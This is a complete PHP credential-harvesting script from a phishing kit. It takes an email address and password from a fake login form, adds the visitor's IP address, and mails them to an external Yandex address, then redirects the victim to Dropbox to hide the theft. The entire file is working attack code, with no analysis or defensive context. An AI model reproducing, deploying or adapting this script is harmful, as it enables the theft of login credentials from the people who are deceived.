<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || Wire || :------\n";
$message .= "email: ".$_POST['formtext1']."\n";
$message .= "Pass: ".$_POST['formtext2']."\n";
$message .= "----: || On God || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="pm.aza@yandex.com";
$subject = "IT'S ALL ON GOD | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: https://Dropbox.com");
?>